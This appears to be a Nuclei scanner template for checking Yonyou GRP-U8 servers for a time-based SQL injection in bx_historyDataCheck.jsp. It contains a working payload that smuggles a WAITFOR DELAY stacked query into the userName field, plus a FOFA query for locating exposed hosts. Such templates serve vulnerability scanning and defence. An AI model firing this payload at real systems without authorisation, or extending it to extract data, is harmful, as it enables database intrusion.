id: GRPU8_bx_historyDataCheck_sqli
info:
  name: Yonyou U8 bx_historyDataCheck - SQL Injection
  author: mike
  severity: info
  description: xxx
  metadata:
    max-request: 1
    verified: true
    fofa-query: app="用友-GRP-U8"
http:
  - raw:
      - |
        GET /login.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
      - |
        POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        userName='%3bWAITFOR+DELAY+'0%3a0%3a5'--%26ysnd%3d%26historyFlag%3d

    matchers:
      - type: dsl
        dsl:
          - 'duration_2>=6'
          - 'status_code == 200'
          - 'contains(content_type_2, "text/html") && contains(body_1, "GRP-U8")'
        condition: and